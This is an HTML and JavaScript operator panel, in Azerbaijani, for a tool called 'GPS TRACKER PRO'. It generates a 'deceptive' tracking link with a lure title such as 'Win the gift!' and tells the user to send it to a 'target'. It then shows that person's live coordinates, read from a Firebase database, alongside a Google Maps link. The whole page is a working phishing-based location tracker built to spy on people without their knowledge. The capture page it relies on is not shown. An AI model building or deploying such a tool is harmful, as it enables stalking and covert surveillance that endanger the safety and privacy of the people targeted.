<div style="font-family:'Outfit'; color:white; padding:15px;">
    <div style="text-align:center; margin-bottom:20px;">
        <i class="fas fa-satellite-dish" style="color:var(--cyber); font-size:2rem; animation: pulse 2s infinite;"></i>
        <h2 style="font-family:'Syncopate'; font-size:0.9rem; margin-top:10px;">GPS TRACKER PRO</h2>
    </div>

    <div id="setup-section" style="background:rgba(255,255,255,0.03); border:1px solid var(--border); padding:20px; border-radius:20px; text-align:center;">
        <p style="font-size:0.75rem; opacity:0.6; margin-bottom:15px;">Hədəf üçün "aldadıcı" izləmə linki yaradın:</p>
        
        <div style="display:flex; flex-direction:column; gap:10px;">
            <input type="text" id="fake-title" placeholder="Linkin görünən adı (Məs: 'Hədiyyəni Qazan!')" style="font-size:0.7rem;">
            <button class="btn-main" onclick="createTracker()" style="background:var(--tools); color:black; margin:0;">LİNKİ FORMALAŞDIR</button>
        </div>
        
        <div id="result-link" style="display:none; margin-top:20px; border-top:1px dashed #333; padding-top:15px;">
            <p style="font-size:0.6rem; color:var(--gold);">BU LİNKİ HƏDƏFƏ GÖNDƏR:</p>
            <input type="text" id="final-url" readonly style="width:100%; color:var(--cyber); border:1px solid var(--cyber); background:#000; padding:10px; border-radius:10px; text-align:center; font-size:0.65rem; margin-top:5px;">
            <button onclick="copyTrackLink()" class="btn-main" style="padding:8px; font-size:0.7rem; background:gray;">KOPYALA</button>
        </div>
    </div>

    <div id="live-panel" style="margin-top:25px; display:none;">
        <div style="background:#000; border:1px solid #222; border-radius:15px; padding:15px;">
            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                <span style="font-size:0.7rem; color:var(--cyber);">[ STATUS: CANLI ]</span>
                <span id="target-count" style="font-size:0.7rem; color:var(--gold);">HƏDƏF GÖZLƏNİLİR...</span>
            </div>
            
            <div id="log-box" style="height:100px; overflow-y:auto; font-family:monospace; font-size:0.65rem; color:#888; border-bottom:1px solid #222; margin-bottom:10px;">
                > Sistem aktivdir. Hədəf üçün link göndərildi.
            </div>

            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
                <div style="text-align:center;">
                    <small style="font-size:0.5rem; opacity:0.5;">ENLİK (LAT)</small>
                    <div id="lat-val" style="color:var(--tools); font-weight:900;">--.------</div>
                </div>
                <div style="text-align:center;">
                    <small style="font-size:0.5rem; opacity:0.5;">UZUNLUQ (LNG)</small>
                    <div id="lng-val" style="color:var(--tools); font-weight:900;">--.------</div>
                </div>
            </div>

            <a id="gmaps-link" href="#" target="_blank" class="btn-main" style="display:none; background:white; color:black; text-decoration:none; text-align:center; margin-top:15px; font-size:0.8rem;">XƏRİTƏDƏ GÖR (GOOGLE MAPS)</a>
        </div>
    </div>
</div>

<script>
    function createTracker() {
        const uid = localStorage.getItem('elite_session');
        // Linki tam dürüst formalaşdırmaq üçün:
        const currentLoc = window.location.href.split('?')[0].replace('gps.html', 'index.html');
        const finalUrl = currentLoc + "?target=" + uid;
        
        document.getElementById('final-url').value = finalUrl;
        document.getElementById('result-link').style.display = 'block';
        document.getElementById('live-panel').style.display = 'block';
        
        // Firebase dinləyicisini başlat
        db.ref('live_tracks/' + uid).on('value', snap => {
            const data = snap.val();
            if(data) {
                document.getElementById('target-count').innerText = "HƏDƏF TAPILDI!";
                document.getElementById('lat-val').innerText = data.lat.toFixed(6);
                document.getElementById('lng-val').innerText = data.lng.toFixed(6);
                document.getElementById('gmaps-link').href = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
                document.getElementById('gmaps-link').style.display = 'block';
                
                const box = document.getElementById('log-box');
                box.innerHTML = `<div>> [${new Date().toLocaleTimeString()}] Koordinat yeniləndi.</div>` + box.innerHTML;
            }
        });
    }

    function copyTrackLink() {
        const copyText = document.getElementById("final-url");
        copyText.select();
        document.execCommand("copy");
        alert("Link kopyalandı! İndi hədəfə göndər.");
    }
</script>
